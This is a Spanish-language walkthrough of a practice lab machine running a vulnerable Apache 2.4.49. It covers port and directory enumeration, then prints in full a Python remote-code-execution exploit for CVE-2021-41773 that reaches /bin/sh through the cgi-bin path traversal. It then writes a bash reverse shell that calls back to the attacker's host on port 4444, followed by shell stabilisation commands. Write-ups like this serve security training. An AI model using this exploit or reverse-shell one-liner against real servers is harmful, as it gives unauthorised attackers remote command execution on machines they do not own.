## FASE ENUMERACIÓN

Sabiendo que la IP de la máquina victima es :172.17.0.2
comprobamos trazabilidad:
```bash
ping -c 1 172.17.0.2
```
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.064 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.064/0.064/0.064/0.000 ms
```

tenemos trazabilidad con la máquina y con el ttl=64 sabemos que se trata de una linux

Comprobamos que puertos tiene abiertos y que servicios y versiones corren por ellos:
```bash
 sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Comando Ping
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
 -Puerto 80
 Si más que rascar vamos a lanzar un whatweb para ver que nos reporta:

 ```bash
whatweb http://172.17.0.2    | tee whatweb
```
```
http://172.17.0.2 [200 OK] Apache[2.4.49], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[172.17.0.2], Title[Comando Ping]
```
que corre un apache 2.4.49 y poco más...bueno poco más...es versión vulnerable

abrimos la página y con CTRL+C miramos el código fuente, donde vemos cosas imteresantes:
```
   <div data-note="Hay pistas en un html , fuzzing de ficheros"></div>
```

Así pues procedemos a hacer un fuzzing:
```bash
 feroxbuster -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,js,old,bak -o fuzzFero
```
```
200      GET      110l      349w     4688c http://172.17.0.2/
200      GET      110l      349w     4688c http://172.17.0.2/index.html
200      GET       28l       66w      766c http://172.17.0.2/html.html
```
En http://172.17.0.2/html.html podemos leer lo siguiente:
```
En principio a punky le gusta ping y hacer cosas raras con ese versatil comando
```

bueno vamos a centrarnos en la version vunerable de apache:
```bash
gobuster dir -u http://172.17.0.2/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,txt,php,html,pl,py,cgi,bak -t 50                                                                
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,pl,py,cgi,bak,sh,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/printenv             (Status: 500) [Size: 531]
/shell.cgi            (Status: 500) [Size: 531]
/test-cgi             (Status: 500) [Size: 531]
Progress: 41526 / 41535 (99.98%)
===============================================================
Finished
===============================================================
```
busco vulnerabilidades para esa versión y encuentro este script:
```bash
https://github.com/thehackersbrain/CVE-2021-41773
```
```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: Gaurav Raj https://gauravraj.xyz
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773


#!/usr/bin/python3

import argparse
import requests


def runcmd(target):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("\033[1;36m>>> \033[0m")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            data = "echo Content-Type: text/plain; echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def banner():
    print('''--------------------------------------------------------
|                \033[1;32mApache2 2.4.49\033[1;37m - \033[1;31mExploit\033[0m              |
--------------------------------------------------------''')


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', '--target', help='Specify the target IP or Domain. eg: 127.0.0.1 or example.com', required=True)
    arg = parser.parse_args()
    banner()
    try:
        runcmd(arg.target)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()
```
me pongo en escucha en el puerto 4444
```bash
sudo nc -nvlp 4444
```
ejecuto el script
```bash
python exploit2 -t 172.17.0.2
```
creo un script en /tmp
```bash
echo "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 " > /tmp/rev.sh
```
y lo ejecuto
```bash
/bin/bash /tmp/rev.sh
```
tratamiento tty:
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 237
```


